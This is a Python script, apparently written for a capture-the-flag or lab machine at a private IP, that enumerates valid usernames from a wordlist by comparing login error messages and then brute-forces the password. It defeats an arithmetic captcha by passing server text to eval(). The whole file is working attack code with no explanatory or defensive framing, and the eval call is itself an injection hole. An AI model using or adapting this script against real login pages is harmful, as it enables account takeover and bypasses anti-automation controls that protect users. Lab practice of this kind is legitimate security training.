import requests
from bs4 import BeautifulSoup
import re


def solve_captcha2(response):
    captcha_question = re.findall(' (.*?) = ? ', response.text)[0].strip()
    solution = eval(captcha_question)
    return str(solution)




url = "http://10.10.6.235/login"

usernames = open("usernames.txt", "r") 
passwords = open("passwords.txt", "r")




for username in usernames:
    request = requests.session()
    res1 = request.post(url, data={
        "username": username.strip(),
        "password": "example1"
    })
    if "Captcha enabled" in res1.text:

        res2 = request.post(url, data={
        "username": username.strip(),
        "password": "example1",
        "captcha": solve_captcha2(res1)
        }).text
        
        print(f"[*] Attempting Username: {username}")

        if f"The user &#39;{username.strip()}&#39; does not exist" in res2:
            continue
        else:
            final_username = username
            print("-------------------------------------------")
            print(f"\nFounded Username : {username}")
            print("-------------------------------------------")
            break

            
    else:
        res2 = request.post(url, data={
        "username": username.strip(),
        "password": "example1"
        })
        print(f"[*] Attempting Username: {username}")

        if f"The user &#39;{username.strip()}&#39; does not exist" not in res2:
            final_username = username
            print("-------------------------------------------")
            print(f"Founded Username : {username}")
            print("-------------------------------------------")
            

 ##########################################################################################################
            
for password in passwords:
    request = requests.session()

    res3 = request.post(url, data={
        "username": username.strip(),
        "password": password.strip()
    })

    if "Captcha enabled" in res3.text:
        res4 = request.post(url, data={
        "username": username.strip(),
        "password": password.strip(),
        "captcha": solve_captcha2(res3)
        }).text
        print(f"{username.strip()}, Attempting password: {password}")
        
        if f"Invalid password for user &#39;{username.strip()}&#39;" in res4:
                continue
        else:
            print("-------------------------------------------")
            print(f"\nFounded Password: {password}")
            print("-------------------------------------------")
            break

    else:
        res5 = request.post(url, data={
            "username": username.strip(),
            "password": password.strip()
        }).text
        print(f"{username.strip()}, Attempting password: {password.strip()}")

        if f"Invalid password for user &#39;{username.strip()}&#39;" in res5:
                continue
        else:
            print("-------------------------------------------")
            print(f"\nFounded Password: {password}")
            print("-------------------------------------------")
            break

        